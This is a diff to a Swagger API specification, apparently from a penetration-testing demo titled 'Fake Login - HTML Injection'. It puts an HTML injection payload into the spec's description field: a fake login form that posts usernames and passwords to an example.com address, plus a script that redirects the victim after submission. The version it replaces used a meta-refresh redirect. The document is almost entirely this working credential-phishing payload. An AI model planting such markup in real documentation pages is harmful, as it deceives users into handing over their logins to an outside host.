@@ -2,30 +2,35 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Fake Login - HTML Injection
-  description: '<div class="login-form">
-    <div class="heading">
-        <h1>HTML Injection : Resilience PT</h1>
+  description: |
+    <div class="login-form">
+      <div class="heading">
+          <h1>HTML Injection : Resilience PT</h1>
+      </div>
+      <div class="form-container">
+          <form id="login-form" action="https://example.com/login" method="post" class="form-signin">
+              <div class="form-group">
+                  <label for="username">Username</label>
+                  <input type="text" name="username" size="20">
+              </div>
+              <div class="form-group">
+                  <label for="password">Password</label>
+                  <input type="password" name="password" size="20">
+              </div>
+              <div class="form-group">
+                  <button type="submit" class="btn btn-default">Login</button>
+              </div>
+          </form>
+      </div>
     </div>
-    <div class="form-container">
-    
-<head>
-  <meta http-equiv='refresh' content='0; URL=http://example.com/'>
-</head>
-        <form action="https://example.com/login" method="post" class="form-signin">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" name="username" size="20">
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" name="password" size="20">
-            </div>
-            <div class="form-group">
-                <button type="submit" class="btn btn-default">Login</button>
-            </div>
-        </form>
-    </div>
-</div>'
+    <script>
+      document.getElementById('login-form').addEventListener('submit', function() {
+        // Redirect to another page after form submission
+        setTimeout(function() {
+          window.location.href = 'https://your-redirect-url.com';
+        }, 1000); // Adjust timeout as necessary
+      });
+    </script>
 paths:
   /:
     post:
